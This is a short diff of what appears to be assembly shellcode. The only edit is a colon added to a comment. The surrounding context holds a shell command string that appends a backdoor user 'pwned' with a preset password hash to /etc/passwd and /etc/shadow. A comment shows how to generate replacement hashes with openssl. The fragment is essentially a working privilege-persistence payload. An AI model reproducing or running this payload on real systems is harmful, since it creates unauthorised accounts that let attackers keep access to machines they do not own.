@@ -25,5 +25,5 @@ _realstart:
 findaddress:
     call _realstart
     string : db "/bin/shZ-cZecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash>>/etc/passwd;echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::>>/etc/shadow"
-    ; you can generate new hashes with
+    ; you can generate new hashes with:
     ; echo '$pass$' | openssl passwd -stdin -6 | sed -e 's/\$/\\$/g'
